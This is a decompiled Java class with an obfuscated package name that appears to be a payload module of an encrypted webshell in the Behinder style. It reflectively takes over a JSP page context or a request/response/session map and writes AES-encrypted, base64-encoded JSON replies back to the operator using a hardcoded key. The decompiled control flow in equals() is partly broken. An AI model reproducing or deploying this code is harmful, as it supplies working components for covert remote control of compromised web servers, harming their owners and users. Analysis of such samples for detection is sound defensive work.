/*
 * Decompiled with CFR 0.152.
 */
package sun.xehx.yuqqv.sxmyq;

import java.lang.reflect.Method;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Quly {
    public static String content;
    public static String payloadBody;
    private Object Request;
    private Object Response;
    private Object Session;

    public Quly() {
        content = "";
        content = content + "c7IcajfXO13OqPiWn5MatxSTtmew1UjQqw1yXiOJWBipO1CgWnLcNq66UgM2OB5iCW6jHEPv5pXfRiFBkmmRUanhsbnAOyh61Mett0XkEMU5L4ji7yQwIqbeMajrNieAWofBrRODYalJPngQqAnvFfrSMX8hBg3RGvpEZPnJSTsTTROqdqlUR13a7w3Y0N20iKK8l7ZlBtYb8vtAJu9yObrlhqOtenkhX6Z9f0eXaccM0OaTQXiHG5PshT0CSt2y0OfF9ug3wvWITcmQkaKSXjzVXmKXU6epSC62fmUKSA0fW3PDMbVhEGxyRe9ILJ2csvqBkifLtxDG3uvhclvu0dSmo3OCDTRPeDIkaRiRfcr1VZMuGcbtX8pc3nkONffufO5LYfHXB8eGITI3FasiuFjPJHxR3bp1D4P5oOKlzvmCzB9NMHEOaC44ZJdHua8qNXw6iJuG6Udfezq5MaAaNuejsJaz7hkPnMSPh8Ye2kLxtg28onomyC6PnjIYOLYyUH2E79KCQ3ujgDNq6uKnT8a34h7SpDKZ2ExdDfibnnzHTJnmNRpEM0T7tXDtCdhaH6VUMJ6ziBfd4RLLBeb4jSGu1gTyB6mhEQKTOncS9LdJRwoNlIa183F38Ofe4FHYYmvf7rwmQDAWiqrubjff5UvafhNp5X6y0nPNPmZf1fPYd66PYVhOEXQZo5EBvvaXnXwPYg0yeV0vFfNCUkaFp663waccRpEpcM2jSbVUe1hyn4ZBGiIkGsAc33ZAp4alo0JzDFOWmApz9eHs0Nql1vhcmo4pShLCvem52pkkF";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Loose catch block
     */
    public boolean equals(Object obj) {
        block10: {
            LinkedHashMap<String, String> result = new LinkedHashMap<String, String>();
            this.fillContext(obj);
            result.put("status", "success");
            result.put("msg", content);
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            break block10;
            catch (Exception e) {
                try {
                    result.put("msg", e.getMessage());
                    result.put("status", "success");
                }
                catch (Throwable throwable) {
                    try {
                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        Method write = so.getClass().getMethod("write", byte[].class);
                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    }
                    catch (Exception e2) {
                        e2.printStackTrace();
                    }
                    throw throwable;
                }
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so.getClass().getMethod("write", byte[].class);
                    write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                }
                catch (Exception e3) {
                    e3.printStackTrace();
                }
            }
        }
        return true;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                value = this.base64encode(value.getBytes());
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error) {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "bc2172db605712b9";
        byte[] byArray2 = string.getBytes("utf-8");
        SecretKeySpec secretKeySpec = new SecretKeySpec(byArray2, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] byArray3 = cipher.doFinal(byArray);
        try {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object object = clazz.getMethod("getEncoder", null).invoke(clazz, null);
            byArray3 = (byte[])object.getClass().getMethod("encode", byte[].class).invoke(object, new Object[]{byArray3});
        }
        catch (Throwable throwable) {
            Class<?> clazz = Class.forName("sun.misc.BASE64Encoder");
            Object obj = clazz.newInstance();
            String string2 = (String)obj.getClass().getMethod("encode", byte[].class).invoke(obj, new Object[]{byArray3});
            string2 = string2.replace("\n", "").replace("\r", "");
            byArray3 = string2.getBytes();
        }
        return byArray3;
    }
}
